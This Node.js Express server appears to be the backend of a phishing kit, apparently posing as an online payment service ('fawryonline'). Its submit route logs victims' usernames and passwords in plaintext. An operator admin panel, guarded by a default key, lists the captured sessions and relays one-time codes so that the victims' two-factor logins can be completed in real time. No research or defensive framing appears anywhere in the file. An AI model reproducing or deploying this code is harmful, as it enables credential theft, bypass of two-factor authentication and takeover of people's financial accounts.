const express = require('express');
const cors = require('cors');
const path = require('path');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// ── In-memory session store ──
const sessions = {};

function newId() {
  return crypto.randomBytes(12).toString('hex');
}

// ── CLIENT ROUTES ──

// 1. Login — save credentials, return sessionId
app.post('/api/submit', (req, res) => {
  const { username, password } = req.body;
  if (!username || !password) return res.status(400).json({ error: 'missing fields' });

  const sessionId = newId();
  sessions[sessionId] = {
    sessionId,
    username,
    password,
    time: new Date().toISOString(),
    status: 'waiting',   // waiting → otp_sent → otp_received
    otp: null,
    userOtp: null,
  };
  console.log(`[LOGIN] ${username} / ${password} → ${sessionId}`);
  res.json({ sessionId });
});

// 2. Poll for OTP (frontend polls every 3s)
app.get('/api/check-otp/:sessionId', (req, res) => {
  const s = sessions[req.params.sessionId];
  if (!s) return res.json({ status: 'not_found' });
  if (s.status === 'otp_sent' && s.otp) {
    return res.json({ status: 'otp_sent', otp: s.otp });
  }
  res.json({ status: s.status });
});

// 3. User submits OTP
app.post('/api/submit-otp', (req, res) => {
  const { sessionId, otp } = req.body;
  const s = sessions[sessionId];
  if (!s) return res.status(404).json({ error: 'session not found' });
  s.userOtp = otp;
  s.status = 'otp_received';
  console.log(`[OTP] session ${sessionId} → user entered: ${otp}`);
  res.json({ success: true });
});

// ── ADMIN ROUTES ──

const ADMIN_KEY = process.env.ADMIN_KEY || 'admin123';

function checkAdmin(req, res) {
  const key = req.headers['x-admin-key'] || req.query.key;
  if (key !== ADMIN_KEY) {
    res.status(401).json({ error: 'unauthorized' });
    return false;
  }
  return true;
}

// List all sessions
app.get('/admin/sessions', (req, res) => {
  if (!checkAdmin(req, res)) return;
  const list = Object.values(sessions).sort((a, b) => b.time.localeCompare(a.time));
  res.json(list);
});

// Admin sends OTP to a session
app.post('/admin/send-otp', (req, res) => {
  if (!checkAdmin(req, res)) return;
  const { sessionId, otp } = req.body;
  const s = sessions[sessionId];
  if (!s) return res.status(404).json({ error: 'session not found' });
  s.otp = otp;
  s.status = 'otp_sent';
  console.log(`[ADMIN] sent OTP ${otp} to session ${sessionId}`);
  res.json({ success: true });
});

// Delete a session
app.delete('/admin/sessions/:sessionId', (req, res) => {
  if (!checkAdmin(req, res)) return;
  delete sessions[req.params.sessionId];
  res.json({ success: true });
});

// Clear all sessions
app.delete('/admin/sessions', (req, res) => {
  if (!checkAdmin(req, res)) return;
  Object.keys(sessions).forEach(k => delete sessions[k]);
  res.json({ success: true });
});

// ── SELF-PING (keeps Render free tier awake) ──
const SERVICE_URL = process.env.SERVICE_URL || `https://fawryonline.onrender.com`;
setInterval(() => {
  const https = SERVICE_URL.startsWith('https') ? require('https') : require('http');
  https.get(`${SERVICE_URL}/ping`, (r) => {
    console.log(`[${new Date().toISOString()}] Self-ping: ${r.statusCode}`);
  }).on('error', (e) => {
    console.log(`[${new Date().toISOString()}] Self-ping: ERROR`);
  });
}, 60 * 1000); // every 1 minute

app.get('/ping', (req, res) => res.send('ok'));

// ── SERVE ADMIN PAGE ──
app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
